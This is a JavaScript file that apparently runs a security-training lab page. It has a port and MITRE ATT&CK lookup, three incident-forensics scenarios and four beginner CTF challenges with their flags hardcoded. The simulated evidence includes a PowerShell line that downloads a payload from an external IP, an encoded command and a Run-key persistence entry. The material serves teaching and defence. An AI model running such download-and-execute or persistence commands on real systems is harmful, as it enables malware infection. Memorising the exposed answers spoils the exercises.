document.addEventListener('DOMContentLoaded', () => {
    initPortLookup();
    initMitreLookup();
    initForensics();
    initCTF();
});

// Port Lookup - IANA-assigned common ports (reference data only)
const COMMON_PORTS = [
    { port: 20, proto: 'TCP', service: 'FTP Data' },
    { port: 21, proto: 'TCP', service: 'FTP' },
    { port: 22, proto: 'TCP', service: 'SSH' },
    { port: 23, proto: 'TCP', service: 'Telnet' },
    { port: 25, proto: 'TCP', service: 'SMTP' },
    { port: 53, proto: 'UDP/TCP', service: 'DNS' },
    { port: 67, proto: 'UDP', service: 'DHCP Server' },
    { port: 68, proto: 'UDP', service: 'DHCP Client' },
    { port: 80, proto: 'TCP', service: 'HTTP' },
    { port: 110, proto: 'TCP', service: 'POP3' },
    { port: 123, proto: 'UDP', service: 'NTP' },
    { port: 143, proto: 'TCP', service: 'IMAP' },
    { port: 443, proto: 'TCP', service: 'HTTPS' },
    { port: 445, proto: 'TCP', service: 'SMB' },
    { port: 993, proto: 'TCP', service: 'IMAPS' },
    { port: 995, proto: 'TCP', service: 'POP3S' },
    { port: 1433, proto: 'TCP', service: 'MSSQL' },
    { port: 1521, proto: 'TCP', service: 'Oracle' },
    { port: 3306, proto: 'TCP', service: 'MySQL' },
    { port: 3389, proto: 'TCP', service: 'RDP' },
    { port: 5432, proto: 'TCP', service: 'PostgreSQL' },
    { port: 5900, proto: 'TCP', service: 'VNC' },
    { port: 6379, proto: 'TCP', service: 'Redis' },
    { port: 8080, proto: 'TCP', service: 'HTTP Proxy' },
    { port: 8443, proto: 'TCP', service: 'HTTPS Alt' },
    { port: 27017, proto: 'TCP', service: 'MongoDB' },
];

// MITRE ATT&CK - Enterprise techniques (reference: attack.mitre.org)
const MITRE_TECHNIQUES = [
    { id: 'T1595', tactic: 'Reconnaissance', name: 'Active Scanning', desc: 'Probe victim infrastructure via network traffic to gather information.' },
    { id: 'T1592', tactic: 'Reconnaissance', name: 'Gather Victim Host Information', desc: 'Collect host hardware, software, or organizational details.' },
    { id: 'T1583', tactic: 'Resource Development', name: 'Acquire Infrastructure', desc: 'Buy, lease, or obtain infrastructure (servers, domains, VPS).' },
    { id: 'T1586', tactic: 'Resource Development', name: 'Compromise Accounts', desc: 'Obtain credentials for use in targeting.' },
    { id: 'T1566', tactic: 'Initial Access', name: 'Phishing', desc: 'Send phishing messages to gain access to victim systems.' },
    { id: 'T1190', tactic: 'Initial Access', name: 'Exploit Public-Facing Application', desc: 'Exploit vulnerabilities in internet-facing applications.' },
    { id: 'T1133', tactic: 'Initial Access', name: 'External Remote Services', desc: 'Leverage external remote services to gain access.' },
    { id: 'T1059', tactic: 'Execution', name: 'Command and Scripting Interpreter', desc: 'Abuse command and script interpreters to execute commands.' },
    { id: 'T1204', tactic: 'Execution', name: 'User Execution', desc: 'Trick users into executing malicious content.' },
    { id: 'T1047', tactic: 'Execution', name: 'Windows Management Instrumentation', desc: 'Abuse WMI for local/remote execution.' },
    { id: 'T1547', tactic: 'Persistence', name: 'Boot or Logon Autostart Execution', desc: 'Configure auto-execution at boot/logon (Registry, startup folder).' },
    { id: 'T1053', tactic: 'Persistence', name: 'Scheduled Task/Job', desc: 'Abuse task scheduling for initial or recurring execution.' },
    { id: 'T1098', tactic: 'Persistence', name: 'Account Manipulation', desc: 'Modify accounts to maintain access (SSH keys, cloud roles).' },
    { id: 'T1548', tactic: 'Privilege Escalation', name: 'Abuse Elevation Control Mechanism', desc: 'Bypass UAC, abuse setuid/setgid, or sudo.' },
    { id: 'T1134', tactic: 'Privilege Escalation', name: 'Access Token Manipulation', desc: 'Modify tokens to operate under different security context.' },
    { id: 'T1068', tactic: 'Privilege Escalation', name: 'Exploitation for Privilege Escalation', desc: 'Exploit software vulnerabilities to elevate privileges.' },
    { id: 'T1070', tactic: 'Defense Evasion', name: 'Indicator Removal', desc: 'Delete or alter artifacts to cover tracks.' },
    { id: 'T1562', tactic: 'Defense Evasion', name: 'Impair Defenses', desc: 'Disable or modify security tools and logging.' },
    { id: 'T1027', tactic: 'Defense Evasion', name: 'Obfuscated Files or Information', desc: 'Encode or encrypt files to evade detection.' },
    { id: 'T1003', tactic: 'Credential Access', name: 'OS Credential Dumping', desc: 'Dump credentials from OS (LSASS, SAM, etc.).' },
    { id: 'T1110', tactic: 'Credential Access', name: 'Brute Force', desc: 'Systematically guess passwords or crack hashes.' },
    { id: 'T1557', tactic: 'Credential Access', name: 'Adversary-in-the-Middle', desc: 'Position between devices (LLMNR poisoning, ARP spoofing).' },
    { id: 'T1087', tactic: 'Discovery', name: 'Account Discovery', desc: 'Get listing of valid accounts (local, domain, cloud).' },
    { id: 'T1082', tactic: 'Discovery', name: 'System Information Discovery', desc: 'Get detailed info about OS and hardware.' },
    { id: 'T1046', tactic: 'Discovery', name: 'Network Service Discovery', desc: 'Scan for available network services.' },
    { id: 'T1021', tactic: 'Lateral Movement', name: 'Remote Services', desc: 'Use RDP, VNC, SMB, or other remote services.' },
    { id: 'T1570', tactic: 'Lateral Movement', name: 'Lateral Tool Transfer', desc: 'Transfer tools between systems in the network.' },
    { id: 'T1550', tactic: 'Lateral Movement', name: 'Use Alternate Authentication Material', desc: 'Pass the hash, pass the ticket, etc.' },
    { id: 'T1005', tactic: 'Collection', name: 'Data from Local System', desc: 'Collect data stored on local system.' },
    { id: 'T1113', tactic: 'Collection', name: 'Screen Capture', desc: 'Capture screenshots or recording of displays.' },
    { id: 'T1560', tactic: 'Collection', name: 'Archive Collected Data', desc: 'Compress or encrypt data prior to exfiltration.' },
    { id: 'T1071', tactic: 'Command and Control', name: 'Application Layer Protocol', desc: 'Use web, DNS, or mail protocols for C2.' },
    { id: 'T1095', tactic: 'Command and Control', name: 'Non-Application Layer Protocol', desc: 'Use non-standard layers (ICMP, raw sockets).' },
    { id: 'T1573', tactic: 'Command and Control', name: 'Encrypted Channel', desc: 'Use encryption to hide C2 traffic.' },
    { id: 'T1048', tactic: 'Exfiltration', name: 'Exfiltration Over Alternative Protocol', desc: 'Exfiltrate data over non-standard protocols.' },
    { id: 'T1041', tactic: 'Exfiltration', name: 'Exfiltration Over C2 Channel', desc: 'Exfiltrate data over existing C2 channel.' },
    { id: 'T1567', tactic: 'Exfiltration', name: 'Exfiltration Over Web Service', desc: 'Exfiltrate via cloud storage or web services.' },
    { id: 'T1486', tactic: 'Impact', name: 'Data Encrypted for Impact', desc: 'Encrypt data (ransomware) to disrupt availability.' },
    { id: 'T1489', tactic: 'Impact', name: 'Service Stop', desc: 'Stop or disable services to disrupt operations.' },
    { id: 'T1490', tactic: 'Impact', name: 'Inhibit System Recovery', desc: 'Delete backups, disable recovery to prevent restoration.' },
];

function initMitreLookup() {
    const search = document.getElementById('mitre-search');
    const results = document.getElementById('mitre-results');

    search.addEventListener('input', () => {
        const query = search.value.trim().toLowerCase();

        if (!query) {
            results.innerHTML = '<span class="output-placeholder">Search for a technique</span>';
            return;
        }

        const matches = MITRE_TECHNIQUES.filter(t => {
            const idMatch = t.id.toLowerCase().includes(query);
            const nameMatch = t.name.toLowerCase().includes(query);
            const tacticMatch = t.tactic.toLowerCase().includes(query);
            const descMatch = t.desc.toLowerCase().includes(query);
            return idMatch || nameMatch || tacticMatch || descMatch;
        });

        if (matches.length === 0) {
            results.innerHTML = '<span class="output-placeholder">No matches found</span>';
            return;
        }

        results.innerHTML = matches.map(t =>
            `<div class="mitre-row">
                <span class="mitre-id">${escapeHtml(t.id)}</span>
                <span class="mitre-tactic">${escapeHtml(t.tactic)}</span>
                <div class="mitre-name">${escapeHtml(t.name)}</div>
                <div class="mitre-desc">${escapeHtml(t.desc)}</div>
            </div>`
        ).join('');
    });
}

function initPortLookup() {
    const search = document.getElementById('port-search');
    const results = document.getElementById('port-results');

    search.addEventListener('input', () => {
        const query = search.value.trim().toLowerCase();

        if (!query) {
            results.innerHTML = '<span class="output-placeholder">Search for a port</span>';
            return;
        }

        const matches = COMMON_PORTS.filter(p => {
            const portStr = p.port.toString();
            const serviceLower = p.service.toLowerCase();
            return portStr.includes(query) || serviceLower.includes(query);
        });

        if (matches.length === 0) {
            results.innerHTML = '<span class="output-placeholder">No matches found</span>';
            return;
        }

        results.innerHTML = matches.map(p =>
            `<div class="port-row"><span class="port-num">${p.port}</span> <span class="port-proto">${p.proto}</span> ${escapeHtml(p.service)}</div>`
        ).join('');
    });
}

// CTF source challenge, part 2: "source_hunter}"
// Full flag: flag{om_ctf_ + source_hunter} = flag{om_ctf_source_hunter}

// Forensics Mini-Lab - Multiple scenarios
const FORENSICS_SCENARIOS = {
    1: {
        description: 'Finance employee clicked a fake invoice email and malware was installed. Review the evidence and choose the correct attack.',
        scenarioText: '<p><strong>Scenario:</strong> A Finance staff member receives an email about an overdue invoice. Shortly after opening the attachment, their workstation exhibits suspicious activity. IT has collected artifacts. Inspect the evidence below.</p>',
        tabs: ['email', 'mailclient', 'process', 'powershell', 'dns', 'defender'],
        tabLabels: ['Email', 'Mail Client', 'Process Tree', 'PowerShell', 'DNS / Proxy', 'Defender'],
        evidence: {
            email: `<pre class="forensics-pre">From: accounts@micros0ft-billing.com
Reply-To: support@micros0ft-billing.com
Subject: URGENT: Overdue Invoice - Action Required
Attachment: Invoice_April_2026.docm

SPF: FAIL | DKIM: FAIL
Sender domain not in allowlist</pre>
<p class="forensics-hint">.docm = macro-enabled. micros0ft uses "0" not "o".</p>`,
            mailclient: `<pre class="forensics-pre">Outlook activity, Finance workstation
────────────────────────────────────────────────
09:14 AM  Email received
09:16 AM  Email opened
09:16 AM  Attachment opened (Invoice_April_2026.docm)</pre>
<p class="forensics-hint">User interacted with the email before compromise started.</p>`,
            process: `<pre class="forensics-pre">Process creation chain (09:16 AM)
────────────────────────────────────────────────
OUTLOOK.EXE
    └── WINWORD.EXE
            └── powershell.exe</pre>
<p class="forensics-hint">Email, then Word, then PowerShell. Classic malicious macro behaviour.</p>`,
            powershell: `<pre class="forensics-pre">PowerShell execution log
────────────────────────────────────────────────
powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUA...
Invoke-WebRequest hxxp://45.77.23.112/update.bin -OutFile $env:TEMP\\svc.dat</pre>
<p class="forensics-hint">Encoded command + download from external IP. Malware fetch.</p>`,
            dns: `<pre class="forensics-pre">Proxy / firewall logs
────────────────────────────────────────────────
09:17 AM  cdn-auth-check[.]com  (first request)
09:17 AM  45.77.23.112  (connection established)
09:18 AM  Repeated outbound to 45.77.23.112</pre>
<p class="forensics-hint">Traffic started ~1 min after Word launched PowerShell.</p>`,
            defender: `<pre class="forensics-pre">Windows Defender alert
────────────────────────────────────────────────
09:18 AM  Trojan:Win32/AgentTesla
Path: C:\\Users\\Finance\\AppData\\Local\\Temp\\svc.dat
Status: Detected (post-execution)</pre>
<p class="forensics-hint">Malware in Temp, created after PowerShell download.</p>`
        },
        options: [
            { value: 'phishing', label: 'Phishing email with malicious attachment' },
            { value: 'bruteforce', label: 'Brute-force login attack' },
            { value: 'usb', label: 'USB malware infection' },
            { value: 'insider', label: 'Insider data theft' }
        ],
        correctAnswer: 'phishing',
        feedback: {
            phishing: '🎉 Correct! <strong>Phishing email with malicious attachment.</strong> The evidence chain: suspicious sender (micros0ft-billing.com), macro-enabled .docm, Outlook spawned Word, Word spawned PowerShell, malware downloaded from an external IP, Defender detected a Trojan in Temp.',
            bruteforce: 'Not brute force. There were no repeated failed login attempts, and the attack began when the user opened the email attachment, not from remote authentication attempts.',
            usb: 'Not USB infection. No USB device insert logs or removable drive artifacts. The infection chain starts from Outlook and Word, not from a plugged-in device.',
            insider: 'Not insider theft. There is clear malware execution evidence (PowerShell download, Defender alert). The process tree shows automated malicious behaviour, not a user copying files.'
        }
    },
    2: {
        description: 'Employee plugged in a found USB drive and launched a fake document. Review the evidence and choose the correct attack.',
        scenarioText: '<p><strong>Scenario:</strong> An employee found a USB drive in the office car park and plugged it into their work PC. Shortly after, the workstation exhibited suspicious activity. IT has collected artifacts. Inspect the evidence below.</p>',
        tabs: ['usb', 'recent', 'process', 'dropped', 'persistence', 'defender'],
        tabLabels: ['USB Device Log', 'Recent Files', 'Process Tree', 'Dropped Malware', 'Persistence', 'Defender'],
        evidence: {
            usb: `<pre class="forensics-pre">USBSTOR registry / SetupAPI.dev.log
────────────────────────────────────────────────
Device: USB\\VID_058F&PID_6387
Serial: 5D8F2A1B
First connected: 10:02 AM
Drive letter: E:\\

Source: HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR</pre>
<p class="forensics-hint">Removable device was physically connected before the incident.</p>`,
            recent: `<pre class="forensics-pre">Jump List / Recent files
────────────────────────────────────────────────
10:03 AM  E:\\Salary_Review_2026.pdf.lnk
         Opened from removable drive (E:\\)
         File type: Shortcut (.lnk)

Prefetch: SALARY~1.PDF-*.pf
Shortcut target: powershell.exe -enc ...</pre>
<p class="forensics-hint">User clicked a fake PDF shortcut on the USB. LNK launched PowerShell.</p>`,
            process: `<pre class="forensics-pre">Process creation chain (10:03 AM)
────────────────────────────────────────────────
explorer.exe
    └── powershell.exe
            └── update.exe</pre>
<p class="forensics-hint">Explorer spawned PowerShell (from LNK), then payload. Not Outlook or Word.</p>`,
            dropped: `<pre class="forensics-pre">File system / timeline
────────────────────────────────────────────────
10:04 AM  C:\\Users\\Alex\\AppData\\Roaming\\update.exe
         Created (copied from temp)
         Size: 412 KB

No corresponding file in Downloads or email attachments.</pre>
<p class="forensics-hint">Malware staged in AppData after execution from USB.</p>`,
            persistence: `<pre class="forensics-pre">Registry / Scheduled Tasks
────────────────────────────────────────────────
10:05 AM  Run key created:
         HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
         "WindowsUpdate" = "C:\\Users\\Alex\\AppData\\Roaming\\update.exe"

Scheduled task: \\Microsoft\\Windows\\UpdateCheck
Trigger: At logon</pre>
<p class="forensics-hint">Malware configured to survive reboot.</p>`,
            defender: `<pre class="forensics-pre">Windows Defender alert
────────────────────────────────────────────────
10:07 AM  Trojan:Win32/AgentTesla
Path: E:\\Salary_Review_2026.pdf.lnk (source)
Path: C:\\Users\\Alex\\AppData\\Roaming\\update.exe (dropped)
Status: Detected</pre>
<p class="forensics-hint">Detection ties malware back to the removable drive file.</p>`
        },
        options: [
            { value: 'phishing', label: 'Phishing email with malicious attachment' },
            { value: 'bruteforce', label: 'Brute-force login attack' },
            { value: 'usb', label: 'USB malware infection' },
            { value: 'insider', label: 'Insider data theft' }
        ],
        correctAnswer: 'usb',
        feedback: {
            phishing: 'Not phishing. No suspicious email, no Outlook activity before execution, and no mail attachment open event. The infection chain starts from a file on drive E:\\, not from email.',
            bruteforce: 'Not brute force. No repeated failed logins, no remote login trail, and no abnormal VPN or RDP events. The user physically plugged in a USB and launched a file.',
            usb: '🎉 Correct! <strong>USB malware infection.</strong> The evidence chain: USB inserted at 10:02, fake PDF shortcut opened from E:\\ at 10:03, Explorer spawned PowerShell, malware dropped to AppData, persistence created, Defender alert. No email or remote login involved.',
            insider: 'Not insider theft. Clear malware execution chain exists (LNK to PowerShell to payload), persistence was created, and activity follows a malicious payload, not a user copying files.'
        }
    },
    3: {
        description: 'Attacker brute-forced a VPN account and accessed internal files. Review the evidence and choose the correct attack.',
        scenarioText: '<p><strong>Scenario:</strong> An employee reused a weak password. The company VPN portal was exposed to the internet. Shortly after, access to shared files and sensitive data was detected from their account. IT has collected artifacts. Inspect the evidence below.</p>',
        tabs: ['vpn', 'ad', 'location', 'fileserver', 'baseline', 'statement'],
        tabLabels: ['VPN Auth Log', 'AD / Identity', 'Login Location', 'File Server', 'Activity Baseline', 'Employee Statement'],
        evidence: {
            vpn: `<pre class="forensics-pre">VPN authentication log
────────────────────────────────────────────────
01:12 AM  j.smith  FAIL  (IP: 185.220.101.42)
01:12 AM  j.smith  FAIL  (IP: 185.220.101.42)
01:12 AM  j.smith  FAIL  (IP: 185.220.101.42)
... (18 failed attempts in 4 minutes)
01:16 AM  j.smith  FAIL  (IP: 185.220.101.42)
01:16 AM  j.smith  FAIL  (IP: 185.220.101.42)
01:16 AM  j.smith  SUCCESS (IP: 185.220.101.42)

Same source IP throughout. No MFA challenge.</pre>
<p class="forensics-hint">Classic password guessing pattern: many failures, then success.</p>`,
            ad: `<pre class="forensics-pre">Active Directory / Identity log
────────────────────────────────────────────────
01:12 AM  j.smith  Kerberos pre-auth failed (x18)
01:16 AM  j.smith  Logon successful

Event 4624 (Logon): Type 10 (RemoteInteractive)
Source: VPN gateway
Outside normal hours (employee typically 9 AM to 5 PM)</pre>
<p class="forensics-hint">Account was targeted until access was gained. After-hours login.</p>`,
            location: `<pre class="forensics-pre">Geo-location / IP lookup
────────────────────────────────────────────────
185.220.101.42, Netherlands (Tor exit node)
j.smith  usual location: Sydney, Australia

Last known session: 5:30 PM Sydney (same day)
Successful login: 01:16 AM Sydney = 4:16 PM UTC

Impossible travel: Sydney to Netherlands in 8 hours.</pre>
<p class="forensics-hint">Login likely not from the real user, different country.</p>`,
            fileserver: `<pre class="forensics-pre">File server access log
────────────────────────────────────────────────
01:17 AM  j.smith  \\\\fileserver\\shared  (first access)
01:19 AM  j.smith  \\\\fileserver\\shared\\HR\\  opened
01:19 AM  j.smith  \\\\fileserver\\shared\\Finance\\  opened
01:22 AM  j.smith  Download initiated: 120 files

Session ended: 01:30 AM</pre>
<p class="forensics-hint">Sensitive folders accessed right after VPN login. Bulk download.</p>`,
            baseline: `<pre class="forensics-pre">Endpoint / workstation audit
────────────────────────────────────────────────
No malware process chain on j.smith's workstation
No PowerShell launched from Word or Outlook
No suspicious USB file execution
No Outlook activity 01:01 AM to 01:35 AM

Workstation was idle during the incident.</pre>
<p class="forensics-hint">Account compromise, not local malware. No phishing or USB artifacts.</p>`,
            statement: `<pre class="forensics-pre">Analyst note: employee interview
────────────────────────────────────────────────
j.smith: "I was asleep. I don't use VPN at 1 AM.
I never log in from overseas. I've never been
to the Netherlands."

MFA: Not configured for VPN (password-only).</pre>
<p class="forensics-hint">Helps rule out legitimate activity. Attacker only needed the password.</p>`
        },
        options: [
            { value: 'phishing', label: 'Phishing email with malicious attachment' },
            { value: 'usb', label: 'USB malware infection' },
            { value: 'bruteforce', label: 'Brute-force login attack' },
            { value: 'insider', label: 'Insider data theft' }
        ],
        correctAnswer: 'bruteforce',
        feedback: {
            phishing: 'Not phishing. There was no malicious email, no attachment execution, and no Office app spawning PowerShell. The workstation was idle during the incident.',
            usb: 'Not USB infection. No USB insert logs, no execution from removable drive, and no LNK or fake document opened from USB. The workstation showed no local malware activity.',
            bruteforce: '🎉 Correct! <strong>Brute-force login attack.</strong> The key clues: repeated failed VPN logins (18+), one later success, unusual login location (Netherlands vs Sydney), no MFA, and immediate file access under the same account. Classic credential compromise.',
            insider: 'Not insider theft. The activity starts with a burst of failed logins from an external IP. Login source and location do not match the real employee, who stated they were asleep and not using VPN.'
        }
    }
};

function initForensics() {
    const scenarioNums = document.querySelectorAll('.forensics-scenario-num');
    const descriptionEl = document.getElementById('forensics-description');
    const scenarioEl = document.getElementById('forensics-scenario');
    const tabsContainer = document.getElementById('forensics-tabs');
    const evidenceEl = document.getElementById('forensics-evidence');
    const select = document.getElementById('forensics-conclusion');
    const btn = document.getElementById('forensics-submit-btn');
    const feedback = document.getElementById('forensics-feedback');

    let currentScenario = 1;

    function loadScenario(num) {
        currentScenario = parseInt(num, 10);
        const s = FORENSICS_SCENARIOS[currentScenario];

        descriptionEl.textContent = s.description;
        scenarioEl.innerHTML = s.scenarioText;

        scenarioNums.forEach(n => {
            n.classList.toggle('active', parseInt(n.dataset.scenario, 10) === currentScenario);
        });

        tabsContainer.innerHTML = s.tabs.map((key, i) =>
            `<button class="forensics-tab ${i === 0 ? 'active' : ''}" data-evidence="${key}">${s.tabLabels[i]}</button>`
        ).join('');

        select.innerHTML = '<option value="">Select an option</option>' + s.options.map(o =>
            `<option value="${o.value}">${o.label}</option>`
        ).join('');

        if (s.tabs.length) {
            evidenceEl.innerHTML = s.evidence[s.tabs[0]];
        } else {
            evidenceEl.innerHTML = '<p class="forensics-hint">No evidence tabs for this scenario yet.</p>';
        }

        feedback.textContent = '';
        feedback.className = 'forensics-feedback';

        tabsContainer.querySelectorAll('.forensics-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                tabsContainer.querySelectorAll('.forensics-tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                evidenceEl.innerHTML = s.evidence[tab.dataset.evidence] || '';
            });
        });
    }

    scenarioNums.forEach(num => {
        num.addEventListener('click', () => loadScenario(num.dataset.scenario));
    });

    btn.addEventListener('click', () => {
        const s = FORENSICS_SCENARIOS[currentScenario];
        const conclusion = select.value;
        feedback.className = 'forensics-feedback';

        if (!conclusion) {
            feedback.textContent = 'Select a conclusion first.';
            feedback.classList.add('forensics-error');
            return;
        }

        if (s.correctAnswer && conclusion === s.correctAnswer) {
            feedback.innerHTML = s.feedback[conclusion];
            feedback.classList.add('forensics-success');
        } else if (s.feedback[conclusion]) {
            feedback.innerHTML = s.feedback[conclusion];
            feedback.classList.add('forensics-error');
        } else {
            feedback.textContent = 'Scenario not fully configured yet.';
            feedback.classList.add('forensics-error');
        }
    });

    loadScenario(1);
}

// CTF Challenges: 1 decode, 1 inspection, 1 enumeration, 1 manipulation
const CTF_CHALLENGES = {
    decode: {
        clue: '<p><strong>Challenge 1: Decode</strong> this hex string.</p><code class="ctf-ciphertext">666c61677b6f6d5f6374665f736f6c7665647d</code><p class="ctf-hint">Hint: Two hex chars = one byte.</p>',
        flag: 'flag{om_ctf_solved}'
    },
    source: {
        clue: '<p><strong>Challenge 2: View source</strong>. The flag is split across this page. Check HTML comments and the linked JavaScript file.</p><p class="ctf-hint">Hint: Right-click and choose View Page Source. Look for clues in comments. Part 2 is in lab.js.</p>',
        flag: 'flag{om_ctf_source_hunter}'
    },
    robots: {
        clue: '<p><strong>Challenge 3: Robots.txt</strong>. Visit <code>/robots.txt</code> on this site. Find the hidden path and navigate there.</p><p class="ctf-hint">Hint: robots.txt often lists paths crawlers should avoid. Try visiting them.</p>',
        flag: 'flag{om_ctf_robots_path}'
    },
    cookie: {
        clue: '<p><strong>Challenge 4: Cookie</strong>. This page sets a cookie <code>role=guest</code>. Change it to <code>role=admin</code> (DevTools, Application, Cookies), then refresh.</p><p class="ctf-hint">Hint: The flag will appear here once you have the right cookie.</p><p id="ctf-cookie-flag" class="ctf-revealed-flag" style="display:none;">Flag: <code>flag{om_ctf_cookie_admin}</code></p>',
        flag: 'flag{om_ctf_cookie_admin}'
    }
};

function initCTF() {
    const tabs = document.querySelectorAll('.ctf-tab');
    const clueEl = document.getElementById('ctf-clue');
    const input = document.getElementById('ctf-flag');
    const btn = document.getElementById('ctf-submit-btn');
    const feedback = document.getElementById('ctf-feedback');
    const progressEl = document.getElementById('ctf-progress');

    let currentChallenge = 'decode';
    const solved = new Set();

    // Cookie challenge: set role=guest if not present
    if (!document.cookie.includes('role=')) {
        document.cookie = 'role=guest; path=/; max-age=3600';
    }

    function getCookieRole() {
        const m = document.cookie.match(/role=([^;]+)/);
        return m ? m[1].trim() : 'guest';
    }

    function updateProgress() {
        progressEl.textContent = `${solved.size}/4`;
    }

    function showCookieFlagIfAdmin() {
        const flagEl = document.getElementById('ctf-cookie-flag');
        if (flagEl && getCookieRole() === 'admin') {
            flagEl.style.display = 'block';
        }
    }

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            currentChallenge = tab.dataset.challenge;
            clueEl.innerHTML = CTF_CHALLENGES[currentChallenge].clue;
            input.value = '';
            feedback.textContent = '';
            feedback.className = 'ctf-feedback';
            showCookieFlagIfAdmin();
        });
    });

    btn.addEventListener('click', checkFlag);
    input.addEventListener('keypress', (e) => e.key === 'Enter' && checkFlag());

    function checkFlag() {
        const submitted = input.value.trim();
        const correct = CTF_CHALLENGES[currentChallenge].flag;
        feedback.className = 'ctf-feedback';

        if (!submitted) {
            feedback.textContent = 'Enter a flag to submit.';
            feedback.classList.add('ctf-error');
            return;
        }

        if (submitted === correct) {
            solved.add(currentChallenge);
            updateProgress();
            feedback.textContent = '🎉 Correct!';
            feedback.classList.add('ctf-success');
            if (solved.size === 4) {
                feedback.textContent = '🎉 All flags captured! Nice work.';
            }
        } else {
            feedback.textContent = 'Incorrect. Keep trying!';
            feedback.classList.add('ctf-error');
        }
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
